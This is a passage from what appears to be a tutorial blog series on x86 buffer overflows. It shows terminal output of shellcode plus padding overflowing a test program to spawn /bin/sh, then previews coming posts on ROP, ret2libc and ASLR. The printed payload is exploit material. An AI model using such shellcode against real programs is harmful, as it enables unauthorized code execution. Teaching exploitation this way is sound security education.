Input: H1�W�4L�$M1�A�AE0HL��L�DM1HH��H1�H1��;�����/bin/shA�����-pAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
sh-4.3$ exit
exit
[howard@sterling shellcodes]$ 
```

## Next Steps ##

To this point the series has covered: what buffer overflows are, what design features of the x86 processor make them exploitable, the basics of shellcoding, and how to use shellcode with a buffer overflow to execute arbitrary commands. All of this will serve as the building blocks for next several posts in the series, as it is important to have a deep understanding of how it worked originally to understand how it has evolved over time.

In this post a few key features of the stack allowed execution of the "shell3_*.s" shellcodes. In the last post the execute bit on the stack was enabled allowing execution of code directly on the stack. In modern systems the execute permission is almost never turned on for the memory allocated to the stack, making the attack in this post irrelevant. The next post will focus on how knowledge of the C ABI and Assembly programming can be used to exploit the "easy.c" program even when the execute bit is turned off. This will naturally lead to a discussion of Return Oriented Programming (ROP) and the Return To libc (ret2libc) attack.

Posts following the discussion on Return Oriented Programming will delve into Address Space Layout Randomization (ASLR) and talk about the Global Offset Table (GOT) and what to do when return addresses are not so easily predicted before run-time.